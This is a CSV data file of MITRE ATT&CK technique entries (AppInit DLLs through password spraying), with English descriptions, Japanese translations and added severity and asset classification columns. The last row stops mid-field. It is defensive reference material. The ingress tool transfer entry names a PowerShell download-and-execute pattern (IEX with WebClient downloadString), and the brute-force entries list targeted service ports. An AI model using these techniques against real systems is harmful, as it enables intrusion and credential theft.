T1103,,AppInit DLLs,AppInit DLL,"Dynamic-link libraries (DLLs) that are specified in the AppInit_DLLs value in the Registry keys <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows</code> or <code>HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows</code> are loaded by user32.dll into every process that loads user32.dll. In practice this is nearly every program, since user32.dll is a very common library. (Citation: Elastic Process Injection July 2017) Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), these values can be abused to obtain persistence and privilege escalation by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. (Citation: AppInit Registry) The AppInit DLL functionality is disabled in Windows 8 and later versions when secure boot is enabled. (Citation: AppInit Secure Boot)",レジストリキー <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows</code> または <code>HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows</code> のレジストリキーの AppInit_DLLs 値で指定されたダイナミックリンクライブラリ（DLL）は、user32.dll をロードするすべてのプロセスに user32.dll によってロードされます。実際には、user32.dll は非常に一般的なライブラリであるため、これはほぼすべてのプログラムに該当します。 (引用: Elastic Process Injection July 2017) [プロセスインジェクション](https://attack.mitre.org/techniques/T1055)と同様に、これらの値を悪用することで、悪意のあるDLLをコンピュータ上の別プロセスコンテキストでロード・実行させ、永続化や権限昇格を実現できます。 (引用元: AppInit Registry) AppInit DLL機能は、セキュアブートが有効なWindows 8以降のバージョンでは無効化される。(引用元: AppInit Secure Boot),persistence;privilege-escalation,Windows,config_policy_manipulation,privilege_gain,user_interaction;endpoint_execution,specified,Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004,attack-pattern--317fefa6-46c7-4062-adb6-2008cf6bcb41,2017-05-31T21:31:15.409Z,2025-04-25T15:15:20.875Z,,,,
T1104,,Multi-Stage Channels,多段階チャネル,"Adversaries may create multiple stages for command and control that are employed under different conditions or for certain functions. Use of multiple stages may obfuscate the command and control channel to make detection more difficult. Remote access tools will call back to the first-stage command and control server for instructions. The first stage may have automated capabilities to collect basic host information, update tools, and upload additional files. A second remote access tool (RAT) could be uploaded at that point to redirect the host to the second-stage command and control server. The second stage will likely be more fully featured and allow the adversary to interact with the system through a reverse shell and additional RAT features. The different stages will likely be hosted separately with no overlapping infrastructure. The loader may also have backup first-stage callbacks or [Fallback Channels](https://attack.mitre.org/techniques/T1008) in case the original first-stage communication path is discovered and blocked.",攻撃者は、異なる条件下や特定の機能向けに複数のコマンド＆コントロール段階を作成することがあります。複数段階の使用はコマンド＆コントロールチャネルを難読化し、検知を困難にします。 リモートアクセスツールは、指示を受けるために第一段階のコマンドアンドコントロールサーバーにコールバックします。第一段階では、基本的なホスト情報の収集、ツールの更新、追加ファイルのアップロードを自動化する機能を持つ場合があります。この時点で第二のリモートアクセスツール（RAT）がアップロードされ、ホストを第二段階のコマンドアンドコントロールサーバーにリダイレクトすることがあります。第二段階ではより高度な機能が実装され、逆シェルや追加のRAT機能を通じてシステムと対話することが可能になります。 各段階は重複するインフラなしで個別にホストされる可能性が高い。ローダーは、元の一次段階通信経路が発見・遮断された場合に備え、バックアップ用の一次段階コールバックや[フォールバックチャネル](https://attack.mitre.org/techniques/T1008)を備えている場合もある。,command-and-control,Linux;macOS;Windows;ESXi,script_command_execution,remote_control,endpoint_execution;network_connectivity;file_storage_access,specified,Backup Server;Business Workstation;Server (On-Prem/VM),has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0011,attack-pattern--84e02621-8fdf-470f-bd58-993bb6a89d91,2017-05-31T21:31:15.935Z,2025-04-25T15:15:50.032Z,,,,
T1105,,Ingress Tool Transfer,侵入ツール転送,"Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as [ftp](https://attack.mitre.org/software/S0095). Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570)). On Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, [certutil](https://attack.mitre.org/software/S0160), and [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.(Citation: t1105_lolbas) A number of these tools, such as `wget`, `curl`, and `scp`, also exist on ESXi. After downloading a file, a threat actor may attempt to verify its integrity by checking its hash value (e.g., via `certutil -hashfile`).(Citation: Google Cloud Threat Intelligence COSCMICENERGY 2023) Adversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by [User Execution](https://attack.mitre.org/techniques/T1204) (typically after interacting with [Phishing](https://attack.mitre.org/techniques/T1566) lures).(Citation: T1105: Trellix_search-ms) Files can also be transferred using various [Web Service](https://attack.mitre.org/techniques/T1102)s as well as native or otherwise present tools on the victim system.(Citation: PTSecurity Cobalt Dec 2016) In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.(Citation: Dropbox Malware Sync)",攻撃者は外部システムから侵害環境へツールやその他のファイルを転送する可能性があります。ツールやファイルは、コマンド＆コントロールチャネルや[ftp](https://attack.mitre.org/software/S0095)などの代替プロトコルを介して、攻撃者が制御する外部システムから被害者ネットワークへコピーされる場合があります。 侵入後は、侵害された環境内の被害デバイス間でツールを転送/拡散させる可能性もある（例：[横方向ツール転送](https://attack.mitre.org/techniques/T1570)）。 Windows では、攻撃者は `copy`、`finger`、[certutil](https://attack.mitre.org/software/S0160)、および <code>IEX(New-Object Net.WebClient).downloadString()</code> や <code>Invoke-WebRequest</code> などの PowerShell コマンドなど、様々なユーティリティを使用してツールをダウンロードする可能性があります。 Linux および macOS システムでは、`curl`、`scp`、`sftp`、`tftp`、`rsync`、`finger`、`wget` など、さまざまなユーティリティも存在します。(引用元: t1105_lolbas) `wget`、`curl`、`scp` など、これらのツールの多くは ESXi にも存在します。 ファイルダウンロード後、脅威アクターはハッシュ値の確認（例：`certutil -hashfile`経由）により完全性を検証しようとする場合があります。(引用元: Google Cloud Threat Intelligence COSCMICENERGY 2023) 攻撃者はまた、`yum`や`winget`などのインストーラーやパッケージ管理ツールを悪用し、被害者ホストへツールをダウンロードさせることもあります。 攻撃者はまた、Windowsの`search-ms`プロトコルハンドラーなどのファイルアプリケーション機能を悪用し、[ユーザー実行](https://attack.mitre.org/techniques/T1204)によって呼び出されるリモートファイル検索を通じて被害者に悪意のあるファイルを配信しています。 （通常は[フィッシング](https://attack.mitre.org/techniques/T1566)の罠との相互作用後に発生）。(引用元: T1105: Trellix_search-ms) ファイルは、様々な[Webサービス](https://attack.mitre.org/techniques/T1102)や、被害者システム上のネイティブツール・その他のツールを使用して転送される場合もある。(引用元: PTSecurity Cobalt Dec 2016) 場合によっては、攻撃者はDropboxやOneDriveなど、Webベースとオンプレミスクライアント間で同期するサービスを利用して、被害者システムへファイルを転送できる可能性がある。例えば、クラウドアカウントを侵害しサービスのWebポータルにログインすることで、攻撃者は自動同期プロセスをトリガーし、ファイルを被害者のマシンに転送できる。(引用: Dropbox Malware Sync),command-and-control,Linux;macOS;Windows;Network Devices;ESXi,script_command_execution,remote_control,user_interaction;endpoint_execution;network_connectivity;cloud_control_plane;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Network Device (FW/Proxy/AP);Server (On-Prem/VM),has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0011,attack-pattern--e6919abc-99f9-4c6c-95a5-14761e7b2add,2017-05-31T21:31:16.408Z,2025-04-15T19:59:17.217Z,,,,
T1106,,Native API,ネイティブAPI,"Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes.(Citation: NT API Windows)(Citation: Linux Kernel API) These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations. Adversaries may abuse these OS API functions as a means of executing behaviors. Similar to [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system. Native API functions (such as <code>NtCreateProcess</code>) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries.(Citation: OutFlank System Calls)(Citation: CyberBit System Calls)(Citation: MDSec System Calls) For example, functions such as the Windows API <code>CreateProcess()</code> or GNU <code>fork()</code> will allow programs and scripts to start other processes.(Citation: Microsoft CreateProcess)(Citation: GNU Fork) This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.(Citation: Microsoft Win32)(Citation: LIBC)(Citation: GLIBC) Higher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.(Citation: Microsoft NET)(Citation: Apple Core Services)(Citation: MACOS Cocoa)(Citation: macOS Foundation) Adversaries may use assembly to directly or in-directly invoke syscalls in an attempt to subvert defensive sensors and detection signatures such as user mode API-hooks.(Citation: Redops Syscalls) Adversaries may also attempt to tamper with sensors and defensive tools associated with API monitoring, such as unhooking monitored functions via [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001).",攻撃者はネイティブOSアプリケーションプログラミングインターフェース（API）と相互作用し、動作を実行する可能性があります。 ネイティブ API は、ハードウェア/デバイス、メモリ、プロセスなど、カーネル内の低レベル OS サービスを呼び出す制御された手段を提供します。(引用: NT API Windows)(引用: Linux Kernel API) これらのネイティブ API は、システム起動時（他のシステムコンポーネントがまだ初期化されていない状態）や、日常的な操作中のタスクや要求の実行時に OS によって活用されます。 攻撃者はこれらのOS API機能を悪用し、動作を実行する手段とすることがある。[コマンドとスクリプトインタプリタ](https://attack.mitre.org/techniques/T1059)と同様に、ネイティブAPIとそのインターフェース階層は、被害を受けたシステムの様々なコンポーネントと相互作用し利用するためのメカニズムを提供する。 ネイティブAPI関数（例：<code>NtCreateProcess</code>）はシステムコール/syscall経由で直接呼び出されるが、これらの機能はインターフェースやライブラリを介してユーザーモードアプリケーションにも公開されることが多い。（引用元: OutFlank System Calls）（引用元: CyberBit System Calls）（引用元: MDSec System Calls） 例えば、Windows APIの<code>CreateProcess()</code>やGNUの<code>fork()</code>といった関数により、プログラムやスクリプトは他のプロセスを開始できる（引用元：Microsoft CreateProcess）（引用元：GNU Fork）。これにより、API呼び出し元はバイナリの実行、CLIコマンドの実行、モジュールのロードなどを行える。様々なシステム操作向けに数千もの類似API関数が存在する。(引用: Microsoft Win32)(引用: LIBC)(引用: GLIBC) Microsoft .NET や macOS Cocoa などの高レベルなソフトウェアフレームワークも、ネイティブ API と連携するために利用可能です。これらのフレームワークは通常、API 機能に対する言語ラッパー/抽象化を提供し、コードの使いやすさや移植性を考慮して設計されています。(引用: Microsoft NET)(引用: Apple Core Services)(引用: MACOS Cocoa)(引用: macOS Foundation) 攻撃者はアセンブリ言語を用いてシステムコールを直接/間接的に呼び出し、ユーザーモードAPIフックなどの防御センサーや検知シグネチャを回避しようとする可能性があります。(引用: Redops Syscalls) 攻撃者はまた、[ツールの無効化または変更](https://attack.mitre.org/techniques/T1562/001) を通じて監視対象関数のフック解除など、API監視に関連するセンサーや防御ツールへの改ざんを試みる可能性がある。,execution,Windows;macOS;Linux,script_command_execution,foothold,authentication_system;user_interaction;endpoint_execution;cloud_control_plane;logging_monitoring,specified,Business Workstation;Server (On-Prem/VM),has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0002,attack-pattern--391d824f-0ef1-47a0-b0ee-c59a75e27670,2017-05-31T21:31:17.472Z,2025-04-15T19:58:23.043Z,,,,
T1107,,File Deletion,ファイル削除,"Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint. There are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples include native [cmd](https://attack.mitre.org/software/S0106) functions such as DEL, secure deletion tools such as Windows Sysinternals SDelete, or other third-party file deletion tools. (Citation: Trend Micro APT Attack Tools)",攻撃者は侵入活動で残されたファイルを削除する可能性がある。攻撃者がシステムにドロップまたは作成したマルウェア、ツール、その他の非ネイティブファイルは、ネットワーク内で何が行われたか、その方法を示す痕跡を残す。これらのファイルの削除は侵入中に行われることもあれば、侵入後のプロセスの一環として攻撃者の痕跡を最小化するために行われることもある。 ホストOSにはクリーンアップを実行するツールが用意されているが、攻撃者は他のツールも使用する場合がある。例としては、DELなどのネイティブ[cmd](https://attack.mitre.org/software/S0106)機能、Windows Sysinternals SDeleteなどのセキュア削除ツール、その他のサードパーティ製ファイル削除ツールが挙げられる。(引用元: Trend Micro APT Attack Tools),defense-evasion,Linux;macOS;Windows,other,stealth,mfa_in_use;endpoint_execution;network_connectivity;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--56fca983-1cf1-4fd1-bda0-5e170a37ab59,2017-05-31T21:31:17.915Z,2025-04-25T15:15:34.606Z,,,,
T1108,,Redundant Access,冗長アクセス,"**This technique has been deprecated. Please use [Create Account](https://attack.mitre.org/techniques/T1136), [Web Shell](https://attack.mitre.org/techniques/T1505/003), and [External Remote Services](https://attack.mitre.org/techniques/T1133) where appropriate.** Adversaries may use more than one remote access tool with varying command and control protocols or credentialed access to remote services so they can maintain access if an access mechanism is detected or mitigated. If one type of tool is detected and blocked or removed as a response but the organization did not gain a full understanding of the adversary's tools and access, then the adversary will be able to retain access to the network. Adversaries may also attempt to gain access to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use [External Remote Services](https://attack.mitre.org/techniques/T1133) such as external VPNs as a way to maintain access despite interruptions to remote access tools deployed within a target network.(Citation: Mandiant APT1) Adversaries may also retain access through cloud-based infrastructure and applications. Use of a [Web Shell](https://attack.mitre.org/techniques/T1100) is one such way to maintain access to a network through an externally accessible Web server.",**この手法は非推奨です。 適切な場合は[アカウント作成](https://attack.mitre.org/techniques/T1136)、[Webシェル](https://attack.mitre.org/techniques/T1505/003)、[外部リモートサービス](https://attack.mitre.org/techniques/T1133)を使用してください。** 攻撃者は、複数のリモートアクセスツール（異なるコマンド＆コントロールプロトコルや認証済みリモートサービスへのアクセス権限を持つもの）を使用し、あるアクセス手段が検知または対策された場合でもアクセスを維持しようとする可能性があります。ある種類のツールが検知され、対応としてブロックまたは削除されたものの、組織が攻撃者のツールやアクセス手段を完全に把握できていない場合、攻撃者はネットワークへのアクセスを維持できます。 攻撃者はまた、標的ネットワーク内に展開されたリモートアクセスツールが中断されてもアクセスを維持する手段として、外部VPNなどの[外部リモートサービス](https://attack.mitre.org/techniques/T1133)を利用するため、[有効なアカウント](https://attack.mitre.org/techniques/T1078)へのアクセスを試みる可能性がある。（引用元：Mandiant APT1）敵対者はクラウドベースのインフラストラクチャやアプリケーションを介してもアクセスを維持する可能性があります。外部からアクセス可能なWebサーバーを介してネットワークへのアクセスを維持する方法の一つとして、[Webシェル](https://attack.mitre.org/techniques/T1100)の使用が挙げられます。,defense-evasion;persistence,Windows;SaaS;IaaS;Linux;macOS;Office Suite;Identity Provider,credential_abuse,stealth,authentication_system;endpoint_execution;network_connectivity;cloud_control_plane,specified,Business Workstation;Identity / SaaS (IdP/SSO);Management Console for GovCloud;Proxy / Gateway;Server (On-Prem/VM),deprecated;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005;TA0003,attack-pattern--6aabc5ec-eae6-422c-8311-38d45ee9838a,2017-05-31T21:31:18.867Z,2025-04-25T15:15:40.766Z,,,,
T1109,,Component Firmware,コンポーネントファームウェア,"Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",一部の攻撃者は、コンピュータコンポーネントを侵害し、オペレーティングシステムやメインシステムファームウェア（BIOS）の外で攻撃者コードを実行する悪意のあるファームウェアをインストールするために、高度な手段を採用する場合があります。この手法は[システムファームウェア](https://attack.mitre.org/techniques/T1019)と類似していますが、同じ能力や完全性チェックのレベルを持たない他のシステムコンポーネントに対して実施される可能性があります。 悪意のあるデバイスファームウェアは、アクセス維持やハードディスクの再イメージングにおける潜在的な一般的な障害にもかかわらず、システムへの永続的なアクセスレベルを提供すると同時に、ホストソフトウェアベースの防御や整合性チェックを回避する手段となる可能性があります。,defense-evasion;persistence,Windows,other,stealth,user_interaction;endpoint_execution,specified,Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005;TA0003,attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44,2017-05-31T21:31:22.374Z,2025-04-25T15:15:09.960Z,,,,
T1110,,Brute Force,ブルートフォース,"Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained.(Citation: TrendMicro Pawn Storm Dec 2020) Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism.(Citation: Dragos Crashoverride 2018) Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes. Brute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts](https://attack.mitre.org/techniques/T1078) within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), [Account Discovery](https://attack.mitre.org/techniques/T1087), or [Password Policy Discovery](https://attack.mitre.org/techniques/T1201). Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services](https://attack.mitre.org/techniques/T1133) as part of Initial Access.",攻撃者は、パスワードが不明な場合やパスワードハッシュを取得した場合に、アカウントへのアクセスを得るためにブルートフォース手法を使用する可能性がある。(引用元: TrendMicro Pawn Storm Dec 2020) アカウントまたは一連のアカウントのパスワードを知らなくても、攻撃者は反復的なメカニズムを用いて体系的にパスワードを推測する可能性がある。(引用元: Dragos Crashoverride 2018) パスワードのブルートフォース攻撃は、認証情報の有効性を確認するサービスとのやり取りを通じて、あるいはパスワードハッシュなどの事前に取得した認証データに対してオフラインで実行される可能性があります。認証情報のブルートフォース攻撃は、侵害のさまざまな段階で発生する可能性があります。 例えば、攻撃者は被害者環境内の[有効なアカウント](https://attack.mitre.org/techniques/T1078)へのアクセスをブルートフォースで試みる場合があり、その際には[OS認証情報ダンプ](https://attack.mitre.org/techniques/T1003)や [アカウント発見](https://attack.mitre.org/techniques/T1087)、または[パスワードポリシー発見](https://attack.mitre.org/techniques/T1201)といった侵害後の行動から得た知識を活用して、被害者環境内の[有効なアカウント](https://attack.mitre.org/techniques/T1078)へのアクセスをブルートフォース攻撃で試みる可能性があります。 攻撃者は、初期アクセスの一環として、[外部リモートサービス](https://attack.mitre.org/techniques/T1133) などの行動とブルートフォース攻撃を組み合わせる場合もある。,credential-access,Windows;SaaS;IaaS;Linux;macOS;Containers;Network Devices;Office Suite;Identity Provider;ESXi,credential_abuse,credential_gain,authentication_system;network_connectivity;cloud_control_plane,specified,Business Workstation;Identity / SaaS (IdP/SSO);Management Console for GovCloud;Network Device (FW/Proxy/AP);Server (On-Prem/VM),has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0006,attack-pattern--a93494bb-4b80-4ea1-8695-3236a49916fd,2017-05-31T21:31:22.767Z,2025-04-15T19:58:56.556Z,,,,
T1110.001,T1110,Password Guessing,パスワード推測,"Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts. Guessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver) Typically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following: * SSH (22/TCP) * Telnet (23/TCP) * FTP (21/TCP) * NetBIOS / SMB / Samba (139/TCP & 445/TCP) * LDAP (389/TCP) * Kerberos (88/TCP) * RDP / Terminal Services (3389/TCP) * HTTP/HTTP Management Services (80/TCP & 443/TCP) * MSSQL (1433/TCP) * Oracle (1521/TCP) * MySQL (3306/TCP) * VNC (5900/TCP) * SNMP (161/UDP and 162/TCP/UDP) In addition to management services, adversaries may ""target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,"" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020) In default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows ""logon failure"" event ID 4625.",システムや環境内の正当な認証情報を事前に知らない攻撃者は、アカウントへのアクセスを試みるためにパスワードを推測する可能性があります。アカウントのパスワードを知らない攻撃者は、反復的なメカニズムを用いて体系的にパスワードを推測する選択をする場合があります。攻撃者は、システムや環境のパスワードを事前に知らなくても、一般的なパスワードのリストを使用して、作戦中にログイン認証情報を推測することがあります。 パスワード推測は、対象のパスワード複雑性ポリシーを考慮する場合もあれば考慮しない場合もあり、また複数回の失敗後にアカウントをロックアウトする可能性のあるポリシーを使用する場合もある。組織のログイン失敗ポリシーによっては、多数の認証失敗やアカウントロックアウトを引き起こす可能性があるため、パスワード推測はリスクの高い選択肢となり得る。（引用元: Cylance Cleaver）通常、パスワード推測時には一般的に使用されるポート上の管理サービスが利用される。 標的とされる代表的なサービスは以下の通り：* SSH (22/TCP) * Telnet (23/TCP) * FTP (21/TCP) * NetBIOS / SMB / Samba (139/TCP & 445/TCP) * LDAP (389/TCP) * Kerberos (88/TCP) * RDP / ターミナルサービス (3389/TCP) * HTTP/HTTP管理サービス (80/TCP & 443/TCP) * MSSQL (1433/TCP) * Oracle (1521/TCP) * MySQL (3306/TCP) * VNC (5900/TCP) * SNMP (161/UDP および 162/TCP/UDP) 管理サービスに加え、攻撃者は「フェデレーション認証プロトコルを利用するシングルサインオン（SSO）およびクラウドベースのアプリケーション」や、Office 365などの外部向けメールアプリケーションを標的とする可能性がある（出典：US-CERT TA18-068A 2018）。 さらに、攻撃者はネットワークデバイスインターフェース（`wlanAPI`など）を悪用し、無線認証プロトコルを介してアクセス可能なWi-Fiルーターに対してブルートフォース攻撃を仕掛ける可能性がある（出典：Trend Micro Emotet 2020）。デフォルト環境では、LDAPおよびKerberos接続試行はSMB経由のイベント発生を引き起こす可能性が低く、Windowsの「ログオン失敗」イベントID 4625を生成する。,credential-access,Windows;SaaS;IaaS;Linux;macOS;Containers;Network Devices;Office Suite;Identity Provider;ESXi,credential_abuse,credential_gain,authentication_system;identity_federation;user_interaction;network_connectivity;email_infrastructure;cloud_control_plane;saas_in_use;database_access;logging_monitoring,specified,AD / Directory Server;Business Workstation;File Server;Identity / SaaS (IdP/SSO);Log / Monitoring Server;Mail / Collaboration;Management Console for GovCloud;Network Device (FW/Proxy/AP);Server (On-Prem/VM);Wireless Access Point,subtechnique;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0006,attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119,2020-02-11T18:38:22.617Z,2025-04-15T19:58:04.272Z,,,,
T1110.002,T1110,Password Cracking,パスワードクラッキング,"Adversaries may use password cracking to attempt to recover usable credentials, such as plaintext passwords, when credential material such as password hashes are obtained. [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) can be used to obtain password hashes, this may only get an adversary so far when [Pass the Hash](https://attack.mitre.org/techniques/T1550/002) is not an option. Further, adversaries may leverage [Data from Configuration Repository](https://attack.mitre.org/techniques/T1602) in order to obtain hashed credentials for network devices.(Citation: US-CERT-TA18-106A) Techniques to systematically guess the passwords used to compute hashes are available, or the adversary may use a pre-computed rainbow table to crack hashes. Cracking hashes is usually done on adversary-controlled systems outside of the target network.(Citation: Wikipedia Password cracking) The resulting plaintext password resulting from a successfully cracked hash may be used to log into systems, resources, and services in which the account has access.",攻撃者は、パスワードハッシュなどの認証情報を入手した場合、平文パスワードなどの使用可能な認証情報を回復するためにパスワードクラッキングを試みる可能性があります。 [OS 認証情報ダンプ](https://attack.mitre.org/techniques/T1003) を使用してパスワードハッシュを取得できますが、[Pass the Hash](https://attack.mitre.org/techniques/T1550/002) が利用できない場合、攻撃者の手段はこれに限られる可能性があります。 さらに、攻撃者はネットワーク機器のハッシュ化された認証情報を取得するために[設定リポジトリからのデータ](https://attack.mitre.org/techniques/T1602)を活用する可能性がある（出典: US-CERT-TA18-106A）。ハッシュ計算に使用されたパスワードを体系的に推測する手法が存在するか、攻撃者は事前計算されたレインボーテーブルを用いてハッシュを解読する可能性がある。 ハッシュの解読は通常、標的ネットワーク外の攻撃者管理システムで行われる（出典：Wikipedia パスワードクラッキング）。解読に成功したハッシュから得られた平文パスワードは、当該アカウントがアクセス権を持つシステム、リソース、サービスへのログインに使用される可能性がある。,credential-access,Linux;macOS;Windows;Network Devices;Office Suite;Identity Provider,credential_abuse,credential_gain,authentication_system;network_connectivity;logging_monitoring,specified,Business Workstation;Identity / SaaS (IdP/SSO);Log / Monitoring Server;Management Console for GovCloud;Network Device (FW/Proxy/AP);Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0006,attack-pattern--1d24cdee-9ea2-4189-b08e-af110bf2435d,2020-02-11T18:38:56.197Z,2025-04-15T19:58:11.912Z,,,,
T1110.003,T1110,Password Spraying,パスワードスプレー攻撃,"Adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Password spraying uses one password (e.g. 'Password01'), or a small list of commonly used passwords, that may match the complexity policy of the domain. Logins are attempted with that password against many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords. (Citation: BlackHillsInfosec Password Spraying) Typically, management services over commonly used ports are used when password spraying. Commonly targeted services include the following: * SSH (22/TCP) * Telnet (23/TCP) * FTP (21/TCP) * NetBIOS / SMB / Samba (139/TCP & 445/TCP) * LDAP (389/TCP) * Kerberos (88/TCP) * RDP / Terminal Services (3389/TCP) * HTTP/HTTP Management Services (80/TCP & 443/TCP) * MSSQL (1433/TCP) * Oracle (1521/TCP) * MySQL (3306/TCP) * VNC (5900/TCP) In addition to management services, adversaries may ""target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,"" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018) In default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows ""logon failure"" event ID 4625.",攻撃者は、有効なアカウント認証情報を取得しようと、単一または少数の一般的なパスワードリストを用いて多数の異なるアカウントに対して攻撃を行う可能性があります。パスワードスプレー攻撃では、ドメインの複雑性ポリシーに適合する可能性のある単一のパスワード（例：「Password01」）または少数の一般的なパスワードリストを使用します。ネットワーク上の多数の異なるアカウントに対してそのパスワードでログインを試行することで、単一アカウントに対して多数のパスワードでブルートフォース攻撃を行った場合に通常発生するアカウントロックアウトを回避します。 (出典: BlackHillsInfosec Password Spraying) 通常、パスワードスプレー攻撃では、一般的に使用されるポート上の管理サービスが標的とされる。 標的とされる代表的なサービスは以下の通り：* SSH (22/TCP) * Telnet (23/TCP) * FTP (21/TCP) * NetBIOS / SMB / Samba (139/TCP & 445/TCP) * LDAP (389/TCP) * Kerberos (88/TCP) * RDP / ターミナルサービス (3389/TCP) * HTTP/HTTP管理サービス (80/TCP & 443/TCP) * MSSQL (1433/TCP) * Oracle (1521/TCP) * MySQL (3306/TCP) * VNC (5900/TCP) 管理サービスに加え、攻撃者は「フェデレーション認証プロトコルを利用するシングルサインオン（SSO）およびクラウドベースのアプリケーション」や、Office 365などの外部向けメールアプリケーションを標的とする可能性がある。（出典: US-CERT TA18-068A 2018） デフォルト環境では、LDAPおよびKerberos接続試行はSMB経由のイベント発生を引き起こす可能性が低く、Windowsの「ログオン失敗」イベントID 4625を生成します。,credential-access,Containers;IaaS;Identity Provider;Linux;Network Devices;Office Suite;SaaS;Windows;macOS;ESXi,credential_abuse,credential_gain,authentication_system;identity_federation;user_interaction;network_connectivity;email_infrastructure;cloud_control_plane;saas_in_use;database_access;logging_monitoring,specified,AD / Directory Server;Business Workstation;File Server;Identity / SaaS (IdP/SSO);Log / Monitoring Server;Mail / Collaboration;Management Console for GovCloud;Network Device (FW/Proxy/AP);Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary 